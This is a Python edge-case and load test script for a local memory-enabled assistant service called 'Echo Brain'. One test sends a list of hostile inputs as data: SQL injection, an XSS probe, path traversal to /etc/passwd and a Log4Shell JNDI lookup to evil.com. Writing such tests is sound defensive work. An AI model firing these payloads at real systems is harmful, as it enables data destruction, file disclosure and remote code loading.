#!/usr/bin/env python3
"""
EDGE CASE & STRESS TESTS FOR ECHO BRAIN
Testing the limits and weird scenarios.
"""

import httpx
import asyncio
import json
import random
import string
import time
from datetime import datetime
import psycopg2

class EdgeCaseTester:
    def __init__(self):
        self.echo_url = "http://localhost:8309"
        self.results = []

    async def test_empty_query(self):
        """Test: What happens with empty query?"""
        print("\n[EDGE CASE 1] Empty Query")
        print("-" * 40)

        async with httpx.AsyncClient() as client:
            try:
                resp = await client.post(
                    f"{self.echo_url}/api/echo/query",
                    json={"query": "", "conversation_id": "edge_test"},
                    timeout=10.0
                )
                if resp.status_code == 200:
                    print(f"✅ Handled empty query gracefully")
                    print(f"   Response: {resp.json()['response'][:100]}")
                    return True
                else:
                    print(f"❌ Failed with status {resp.status_code}")
                    return False
            except Exception as e:
                print(f"❌ Exception: {e}")
                return False

    async def test_huge_query(self):
        """Test: Can it handle a 10,000 character query?"""
        print("\n[EDGE CASE 2] Huge Query (10K chars)")
        print("-" * 40)

        huge_text = "Tell me about " + ("Tower " * 2000)

        async with httpx.AsyncClient() as client:
            try:
                resp = await client.post(
                    f"{self.echo_url}/api/echo/query",
                    json={"query": huge_text, "conversation_id": "edge_test"},
                    timeout=30.0
                )
                if resp.status_code == 200:
                    print(f"✅ Handled 10K character query")
                    response_time = resp.elapsed.total_seconds()
                    print(f"   Response time: {response_time:.2f}s")
                    return True
                else:
                    print(f"❌ Failed with status {resp.status_code}")
                    return False
            except Exception as e:
                print(f"❌ Exception: {e}")
                return False

    async def test_special_characters(self):
        """Test: SQL injection, special chars, unicode"""
        print("\n[EDGE CASE 3] Special Characters & Injection")
        print("-" * 40)

        evil_queries = [
            "'; DROP TABLE echo_conversations; --",
            "{{{{{{{{{{{{}}}}}}}}}}}}",
            "\x00\x01\x02\x03",
            "😈🔥💀 Unicode chaos 你好世界 مرحبا بالعالم",
            "<script>alert('xss')</script>",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/a}"
        ]

        passed = 0
        for evil in evil_queries:
            async with httpx.AsyncClient() as client:
                try:
                    resp = await client.post(
                        f"{self.echo_url}/api/echo/query",
                        json={"query": evil, "conversation_id": "edge_test"},
                        timeout=10.0
                    )
                    if resp.status_code in [200, 400]:
                        passed += 1
                        print(f"  ✅ Safely handled: {evil[:30]}...")
                    else:
                        print(f"  ❌ Unexpected status for: {evil[:30]}...")
                except:
                    passed += 1  # Exception is ok, means it didn't crash
                    print(f"  ✅ Blocked dangerous input: {evil[:30]}...")

        print(f"\n  Result: {passed}/{len(evil_queries)} handled safely")
        return passed == len(evil_queries)

    async def test_concurrent_requests(self):
        """Test: 100 simultaneous requests"""
        print("\n[EDGE CASE 4] 100 Concurrent Requests")
        print("-" * 40)

        async def make_request(session, i):
            try:
                resp = await session.post(
                    f"{self.echo_url}/api/echo/query",
                    json={
                        "query": f"Concurrent test request {i}",
                        "conversation_id": f"concurrent_{i}"
                    },
                    timeout=30.0
                )
                return resp.status_code == 200
            except:
                return False

        start_time = time.time()
        async with httpx.AsyncClient() as client:
            tasks = [make_request(client, i) for i in range(100)]
            results = await asyncio.gather(*tasks)

        elapsed = time.time() - start_time
        success_count = sum(results)

        print(f"  Successful: {success_count}/100")
        print(f"  Total time: {elapsed:.2f}s")
        print(f"  Avg per request: {elapsed/100:.3f}s")

        if success_count >= 95:  # Allow 5% failure rate
            print(f"✅ Handled concurrent load well")
            return True
        else:
            print(f"❌ Too many failures under load")
            return False

    async def test_memory_persistence_after_restart(self):
        """Test: Does memory survive Echo restart?"""
        print("\n[EDGE CASE 5] Memory After Restart")
        print("-" * 40)

        test_key = f"PERSISTENCE_TEST_{int(time.time())}"

        # Store a fact
        async with httpx.AsyncClient() as client:
            await client.post(
                f"{self.echo_url}/api/echo/query",
                json={
                    "query": f"Remember this code: {test_key}",
                    "conversation_id": "persistence_test"
                },
                timeout=10.0
            )

        print(f"  Stored: {test_key}")

        # Simulate restart (we can't actually restart, but check DB)
        try:
            conn = psycopg2.connect(
                host="localhost",
                database="echo_brain",
                user="patrick",
                password="***REMOVED***"
            )
            cursor = conn.cursor()
            cursor.execute("""
                SELECT COUNT(*) FROM echo_unified_interactions
                WHERE query LIKE %s
            """, (f"%{test_key}%",))
            count = cursor.fetchone()[0]
            conn.close()

            if count > 0:
                print(f"✅ Memory persisted in database")

                # Try to recall
                async with httpx.AsyncClient() as client:
                    resp = await client.post(
                        f"{self.echo_url}/api/echo/query",
                        json={
                            "query": "What was the PERSISTENCE_TEST code?",
                            "conversation_id": "persistence_test"
                        },
                        timeout=10.0
                    )
                    if resp.status_code == 200:
                        response = resp.json()["response"]
                        if test_key in response or "PERSISTENCE_TEST" in response:
                            print(f"✅ Memory successfully recalled after simulated restart")
                            return True
                        else:
                            print(f"⚠️ Memory in DB but not recalled properly")
                            return False
            else:
                print(f"❌ Memory not persisted to database")
                return False

        except Exception as e:
            print(f"❌ Database error: {e}")
            return False

    async def test_conflicting_memories(self):
        """Test: How does it handle contradictory information?"""
        print("\n[EDGE CASE 6] Conflicting Information")
        print("-" * 40)

        async with httpx.AsyncClient() as client:
            # Store conflicting facts
            await client.post(
                f"{self.echo_url}/api/echo/query",
                json={
                    "query": "The Tower server IP is ***REMOVED***",
                    "conversation_id": "conflict_test"
                }
            )

            await client.post(
                f"{self.echo_url}/api/echo/query",
                json={
                    "query": "The Tower server IP is 10.0.0.1",
                    "conversation_id": "conflict_test"
                }
            )

            # Ask for the fact
            resp = await client.post(
                f"{self.echo_url}/api/echo/query",
                json={
                    "query": "What is the Tower server IP?",
                    "conversation_id": "conflict_test"
                },
                timeout=10.0
            )

            if resp.status_code == 200:
                response = resp.json()["response"]
                # Should mention the correct one (***REMOVED***)
                if "***REMOVED***" in response:
                    print(f"✅ Resolved conflict correctly")
                    print(f"   Response: {response[:200]}")
                    return True
                else:
                    print(f"⚠️ May have chosen wrong information")
                    print(f"   Response: {response[:200]}")
                    return False

    async def test_rapid_context_switching(self):
        """Test: Rapidly switch between different contexts"""
        print("\n[EDGE CASE 7] Rapid Context Switching")
        print("-" * 40)

        contexts = [
            ("anime_context", "Tell me about anime production"),
            ("code_context", "How do I write Python code"),
            ("tower_context", "What services run on Tower"),
            ("memory_context", "What did we discuss earlier")
        ]

        success = 0
        async with httpx.AsyncClient() as client:
            for _ in range(20):  # Rapidly switch 20 times
                context = random.choice(contexts)
                try:
                    resp = await client.post(
                        f"{self.echo_url}/api/echo/query",
                        json={
                            "query": context[1],
                            "conversation_id": context[0]
                        },
                        timeout=5.0
                    )
                    if resp.status_code == 200:
                        success += 1
                except:
                    pass

        print(f"  Successful switches: {success}/20")
        if success >= 18:  # 90% success rate
            print(f"✅ Handled rapid context switching")
            return True
        else:
            print(f"❌ Failed under rapid context switching")
            return False

    async def test_circular_reference(self):
        """Test: Can it handle circular reasoning?"""
        print("\n[EDGE CASE 8] Circular Reference")
        print("-" * 40)

        async with httpx.AsyncClient() as client:
            # Create circular reference
            await client.post(
                f"{self.echo_url}/api/echo/query",
                json={
                    "query": "A depends on B",
                    "conversation_id": "circular_test"
                }
            )

            await client.post(
                f"{self.echo_url}/api/echo/query",
                json={
                    "query": "B depends on C",
                    "conversation_id": "circular_test"
                }
            )

            await client.post(
                f"{self.echo_url}/api/echo/query",
                json={
                    "query": "C depends on A",
                    "conversation_id": "circular_test"
                }
            )

            # Ask about dependencies
            resp = await client.post(
                f"{self.echo_url}/api/echo/query",
                json={
                    "query": "What does A depend on?",
                    "conversation_id": "circular_test"
                },
                timeout=10.0
            )

            if resp.status_code == 200:
                print(f"✅ Handled circular reference without crashing")
                print(f"   Response: {resp.json()['response'][:200]}")
                return True
            else:
                print(f"❌ Failed on circular reference")
                return False

    async def run_all_edge_tests(self):
        """Run all edge case tests"""
        print("=" * 50)
        print("ECHO BRAIN EDGE CASE TESTING")
        print("=" * 50)

        tests = [
            ("Empty Query", self.test_empty_query),
            ("Huge Query", self.test_huge_query),
            ("Special Characters", self.test_special_characters),
            ("Concurrent Requests", self.test_concurrent_requests),
            ("Memory Persistence", self.test_memory_persistence_after_restart),
            ("Conflicting Info", self.test_conflicting_memories),
            ("Context Switching", self.test_rapid_context_switching),
            ("Circular Reference", self.test_circular_reference)
        ]

        results = []
        for name, test_func in tests:
            try:
                result = await test_func()
                results.append((name, result))
            except Exception as e:
                print(f"❌ {name} crashed: {e}")
                results.append((name, False))

        print("\n" + "=" * 50)
        print("EDGE CASE TEST SUMMARY")
        print("=" * 50)

        passed = sum(1 for _, r in results if r)
        total = len(results)

        for name, result in results:
            status = "✅" if result else "❌"
            print(f"  {status} {name}")

        print(f"\nFINAL SCORE: {passed}/{total} ({passed/total*100:.1f}%)")

        # Save results
        with open("/opt/tower-echo-brain/edge_case_results.json", "w") as f:
            json.dump({
                "timestamp": datetime.now().isoformat(),
                "tests": [{"name": n, "passed": r} for n, r in results],
                "score": f"{passed}/{total}",
                "percentage": passed/total*100
            }, f, indent=2)

        print(f"Results saved to edge_case_results.json")
        return results


if __name__ == "__main__":
    tester = EdgeCaseTester()
    asyncio.run(tester.run_all_edge_tests())